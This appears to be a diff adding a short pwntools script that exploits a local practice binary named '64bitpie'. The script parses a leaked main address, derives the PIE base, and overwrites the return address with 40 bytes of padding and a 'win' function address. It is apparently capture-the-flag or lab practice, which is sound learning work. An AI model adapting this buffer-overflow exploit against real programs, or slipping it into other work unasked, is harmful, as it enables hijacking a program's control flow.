@@ -1,0 +1,23 @@
+from pwn import *
+
+context.update(arch='amd64',os='linux')       #change arch
+elf=ELF('./64bitpie')
+
+proc=process('./64bitpie')
+
+d=proc.recvline()
+main=d[d.decode().find(":")+2:-1].decode()
+main=int(main,16)
+
+base=hex(main-int('0x0000000000001159',16))   # change offset ( get it from gdb)
+base=int(base,16)
+
+win=base+int('0x00000000000011a8',16)
+
+
+offset=b'A'*40                                # change position at which we overwrite return pointer
+payload=offset+p64(win)
+proc.sendline(payload)
+d=proc.recvuntil("D")
+print(d)
+
